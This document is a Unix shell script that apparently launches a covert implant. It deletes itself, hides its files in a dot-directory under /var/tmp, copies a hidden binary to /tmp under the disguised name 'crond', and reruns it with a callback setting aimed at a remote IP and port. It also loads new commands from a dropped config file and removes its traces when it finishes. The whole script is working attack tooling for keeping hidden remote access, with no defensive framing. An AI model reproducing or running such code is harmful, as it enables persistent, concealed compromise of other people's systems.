#!/bin/sh
MAINDIR=/var/tmp/.d32804ef8a03f5a7
EXECDIR=/tmp
TOOLNAME=crond
# END ARGS   :::  DO  NOT  DELETE  THIS  LINE
# Args above here can be changed by autowrapsift, nothing below can.
VER=1.0.0.1
SRCPATH=$MAINDIR/.no
SLEEPFOR=30
RUNFOR=180
RANFOR=0
IP=555.10.32.102
PORT=8899
STDERR=yes
DBGDIR=$MAINDIR/d
DIEDIR=$MAINDIR/.die
ERR=0
CONF=$MAINDIR/.noc
Q=

dbg() {
  [ "$STDERR" ] && echo "NC[$$] $*" 1>&2
  [ -d $DBGDIR ] && echo `date -u`: "($INTF:$FILT)[$$] $*" >> $DBGDIR/.dbg
  [ ! -d $DBGDIR ] && [ $ERR -gt 0 ] && echo `date -u`: "($INTF:$FILT)[$$] ERR=$ERR" >> $DEST1/.D$OUTFILE
}

die() {
  ERR=$1
  shift
  dbg "FATAL: $*"
  cleanup
  exit $ERR
}

cleanup() {
  /bin/rm -f $SRCPATH $CONF $EXECDIR/$TOOLNAME
  rmdir $DIEDIR
}

info() {
    dbg "Using $SRCPATH as $TOOLNAME with D=-uc$IP:$PORT PATH=$PATH LV=$LVERR=$ERR"
}

PATH=$EXECDIR:/bin:/usr/bin:/sbin:/usr/sbin:/usr/ucb
export PATH

dbg DEBUG output will be sent to $DBGDIR/.dbg if that location exists.

trap : TERM

export PATH DEST1 DEST2 DIR TOOL FILT
LV=0
uname -s 2>/dev/null | grep -i "hp" >/dev/null && LV=1

dbg "Removing self ($0)"
rm -f $0 || die 19 Cannot delete $0

[ -d "$MAINDIR" ] || die 12 DIR=$MAINDIR must exist



cd /tmp || cd /var/tmp
dbg "Starting in `pwd`"

WHICH=FIRST
TESTRUN=""
ERRCOUNT=0
MINCOUNT=0
LASTMIN=""

while [ 1 ] ; do 
    [ $RANFOR -gt $RUNFOR ] && break
    dbg sleeping $SLEEPFOR
    sleep $SLEEPFOR
    [ $? -gt 0 ] && ERRCOUNT=`echo $ERRCOUNT+1 | bc`
    RANFOR=`echo $RANFOR+$SLEEPFOR | bc`

    THISMIN=`date -u +%Y%m%d%H%M`
    if [ "$THISMIN" = "$LASTMIN" ] ; then
	MINCOUNT=`echo $MINCOUNT+1 | bc`
    else
	MINCOUNT=0
	LASTMIN=$THISMIN
    fi
    [ $MINCOUNT -gt 5 ] && die 24 over five loops per minute
    dbg LASTMIN=$LASTMIN MINCOUNT=$MINCOUNT


    if [ -s $CONF ] ; then
	MORE=""
	if [ $ERR -gt 0 ] ; then
	    # If ERR last time through AND a config file, we assume here
	    # someone killed the sleep to read in the new config
	    ERRCOUNT=`echo $ERRCOUNT-1 | bc`
	    MORE="... decremented ERRCOUNT to $ERRCOUNT"
	fi
	dbg sourcing/deleting $CONF containing${MORE}: `cat $CONF`
	. $CONF
	TESTRUN=""
	rm -f $CONF
	info
	unset MORE
    fi

    cp -p $SRCPATH $EXECDIR/$TOOLNAME || die 13 Could not cp -p $SRCPATH $EXECDIR/$TOOLNAME
    chmod 700  $EXECDIR/$TOOLNAME|| die 14 Could not chmod 700 $EXECDIR/$TOOLNAME
    [ -x "$EXECDIR/$TOOLNAME" ] || die 15 $EXECDIR/$TOOLNAME not executable

    TEST=`which $TOOLNAME 2>&1| grep "^$EXECDIR/$TOOLNAME$"` 
    [ "$TEST" ] && dbg "continuing, $TOOLNAME is in PATH=$PATH at $TEST"
    [ ! "$TEST" ] && die 11 "TEST=$TEST= PATH=$PATH \n cannot continue $TOOLNAME either not in PATH or not in $EXECDIR (which $TOOLNAME=`which $TOOLNAME 2>&1`)"

    dbg "RUNNING:D=-uc$IP:$PORT $TOOLNAME:"
    D=-uc$IP:$PORT $TOOLNAME
    ERR=$?
    sleep 5
    dbg "Running as D=-uc$IP:$PORT $TOOLNAME returned $ERR"
    if [ $LV -eq 0 ] ; then
	[ -f $EXECDIR/$TOOLNAME ]  && die 16 "$EXECDIR/$TOOLNAME did not self delete \n`ls -al $EXECDIR/$TOOLNAME`"
    fi

    [ "$STDERR" ] && info
    exec >&- 2>&- 3>&- 4>&- 5>&- 6>&- 7>&- 8>&- 9>&-
    unset STDERR

    if [ $ERR -gt 0 ] ; then
	ERRCOUNT=`echo $ERRCOUNT+1 | bc`
	if [ $ERRCOUNT -gt 15 ] ; then
	    die 21 "ERROR COUNT $ERRCOUNT: cannot continue"
	fi
    fi
    [ -d $DIEDIR ] && break
done

dbg "ERR=$ERR ERRCOUNT=$ERRCOUNT DONE: "`ls -ald $DIEDIR 2>/dev/null`
cleanup
